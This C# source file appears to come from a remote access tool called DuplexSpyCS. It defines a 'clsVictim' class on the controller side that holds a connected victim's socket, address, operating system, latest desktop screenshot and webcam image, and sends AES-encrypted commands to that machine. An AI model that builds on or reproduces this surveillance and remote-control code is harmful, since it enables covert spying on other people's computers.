using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using DuplexSpyCS;

public class clsVictim
{
    //SOCKET
    public clsListener m_listener { get; set; }
    public Socket socket;
    public static int MAX_BUFFER_LENGTH = 65536; //Buffer size.
    public byte[] buffer = new byte[MAX_BUFFER_LENGTH];
    public string ID; //VICTIM ONLINE ID
    public string r_addr; //REMOTE IP ADDRESS
    public int r_port; //REMOTE PORT
    public bool unix_like; //VICTIM UNIX LIKE ?

    //LATENCY
    public DateTime last_sent;
    public int latency_time = 100;

    //CRYPTOGRAPHY
    public (string public_key, string private_key) key_pairs;
    public (byte[] key, byte[] iv) _AES;
    public string challenge_text;

    //STATUS
    public int _received_bytes = 0;
    public int ReceivedBytes { get { return _received_bytes; } }
    public int _sent_bytes = 0;
    public int SentBytes { get { return _sent_bytes; } }

    //FOLDER
    public string dir_victim;

    //OS
    public string remoteOS;

    //DESKTOP
    public Image img_LastDesktop;

    //WEBCAM
    public Image img_LastWebcam;

    public clsVictim(clsListener listener, Socket socket)
    {
        if (socket == null)
        {
            MessageBox.Show("Socket is null.", "class Victim", MessageBoxButtons.OK, MessageBoxIcon.Error);
            clsStore.sql_conn.WriteErrorLogs(this, "Null socket");
            return;
        }

        string[] split = socket.RemoteEndPoint.ToString().Split(':');
        this.socket = socket;
        r_addr = split[0];
        r_port = int.Parse(split[1]);
        ID = "[NOT YET]";
        m_listener = listener;
    }

    public void Send(int Command, int Param, string data)
    {
        Send(Command, Param, Encoding.UTF8.GetBytes(data));
    }
    public void Send(int Command, int Param, byte[] buffer)
    {
        if (buffer != null)
        {
            try
            {
                buffer = new clsDSP((byte)Command, (byte)Param, buffer).GetBytes();
                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
                {
                    try
                    {
                        socket.EndSend(ar);
                    }
                    catch (Exception ex)
                    {
                        clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
                    }
                }), buffer);

                clsStore.sent_bytes += buffer.Length;
            }
            catch (Exception ex)
            {
                clsStore.sql_conn.WriteErrorLogs(this, ex.Message);
            }
        }
    }
    public void encSend(int Command, int Param, string data)
    {
        new Thread(() =>
        {
            string enc_data = clsCrypto.AESEncrypt(data, _AES.key, _AES.iv);
            Send(Command, Param, enc_data);

            if (Command == 2 && Param != 1)
                clsStore.sql_conn.WriteSendLogs(this, $"{data.Split('|')[0]}");
        }).Start();
    }
    public void SendCommand(string command)
    {
        encSend(2, 0, command);
    }
    public void fnSendCommand(string[] aMsg)
    {
        fnSendCommand(aMsg.ToList());
    }
    public void fnSendCommand(List<string> lsMsg)
    {
        SendCommand(string.Join("|", lsMsg));
    }

    public void Reconnect()
    {

    }

    public void Disconnect()
    {
        socket.Close();
    }
}
